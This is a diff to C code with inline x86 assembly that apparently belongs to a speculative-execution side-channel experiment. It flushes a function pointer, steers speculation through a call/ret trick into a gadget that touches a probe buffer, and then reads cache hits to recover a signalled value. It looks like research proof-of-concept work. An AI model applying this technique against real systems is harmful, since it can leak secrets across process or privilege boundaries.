@@ -106,6 +106,7 @@ bool get_top_k(uint64_t k, uint64_t* output_i, uint64_t* output_res){
         top_k_res[i]=0;
     }
 
+    // printf("results[0x11] = %ld\n", results[0x11]);
     for (i=0; i<NUM_PROBES; i++) {
 
         if (results[i] < min_hits_allowed){
@@ -172,6 +173,7 @@ void measure() {
 
     int misses = 0;
     uint64_t k = 1;
+    uint64_t width = 10;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
     uint64_t final_i;
@@ -179,9 +181,32 @@ void measure() {
 
     while (1) {
         for (i=0; i<MAX_ITERATIONS; i++) {
-            _mm_clflush(&fn_ptr);
-            //_mm_clflush(&jmp_ptr);
-            indirect(&jmp_ptr);
+             _mm_clflush(&fn_ptr);
+            // _mm_clflush(&jmp_ptr);
+            asm volatile (
+                    "movq (fn_ptr), %%r11\n"
+                    "jmp set_up_return\n"
+                 "inner_indirect_branch:\n"
+                    "call set_up_target\n"
+                "capture_spec:\n"
+                    // "pause\n"
+                    // Signal(0x11)
+                    "movq $0x11, %%rcx\n"
+                    "mov (cur_probe_space), %%rax\n"
+                    "imul %%rcx\n"
+                    "mov (probe_buf), %%rdx\n"
+                    "add %%rax, %%rdx\n"
+                    "mov (%%rdx), %%rax\n"
+                    "nop\n"
+                //     "callq *%%r11\n"
+                    "jmp capture_spec\n"
+                "set_up_target:\n"
+                    "mov %%r11, (%%rsp)\n"
+                    "ret\n"
+                "set_up_return:\n"
+                    "call inner_indirect_branch\n"
+            :::"rax", "rcx", "rdx" );
+
             //((void(*)(void *))map)(&jmp_ptr);
             usleep(1);
         }
@@ -192,8 +217,8 @@ void measure() {
         hit_miss = get_top_k(k, top_k_i, top_k_res);
 
         if (hit_miss){
-            final_i = construct_result(k, 8, top_k_i); 
-            printf("[%08lX] - cache hits: %ld\n\n", final_i, cache_hits);
+            final_i = construct_result(k, width, top_k_i); 
+            printf("[%08lX]\n\n", final_i);
 
             signal_idx++;
             misses = 0;
